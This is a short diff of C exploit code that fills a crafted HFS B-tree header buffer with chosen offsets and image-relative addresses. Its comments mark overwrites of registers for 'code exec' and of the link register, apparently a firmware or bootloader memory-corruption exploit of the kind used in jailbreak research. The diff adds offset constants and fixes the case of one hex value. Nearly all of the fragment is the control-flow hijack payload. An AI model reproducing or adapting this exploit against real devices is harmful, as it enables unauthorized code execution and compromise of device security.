@@ -259,11 +259,19 @@ if (1) {
             PUT_DWORD_BE(buffer, 16, 0x500);                    /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
             PUT_WORD_LE(buffer, 20, 0);                         /* must be zero (see above) */
             PUT_WORD_LE(buffer, 14, 0);                         /* must be zero, to allow r3 to grow */
+            
+            
+#if 1
+#define START_OF_BTREE_HEADER 0x47A54 //useless
+#define START_OF_EXTENTS_BTREE_HEADER 0x47B54
+#define ALIGNED_POINTER_OFFSET 0x47B68
+#endif
+            
 #if 1
             PUT_DWORD_LE(buffer, 78,  (uintptr_t)image + 0x47B68);                      /* *r2 = r4 */
             PUT_DWORD_LE(buffer, 0x47B68 + 4 - 0x47B54, (NODE_SIZE + 0x40) >> 6);       /* *(r0 + 4) = r9 */
             PUT_DWORD_LE(buffer, 0x47B68 + 0x40 - 0x47B54, (uintptr_t)image + 0x47BB1); /* r10 (code exec) */
-            PUT_DWORD_LE(buffer, 0x47B68 + 0x44 - 0x47B54, (uintptr_t)image + 0x47cb4); /* r11 -> lr */
+            PUT_DWORD_LE(buffer, 0x47B68 + 0x44 - 0x47B54, (uintptr_t)image + 0x47CB4); /* r11 -> lr */
 #endif
 #if 0
             PUT_WORD_LE(buffer, 0x47BB0 + 0 - 0x47B54, INSNT_ILLEGAL);
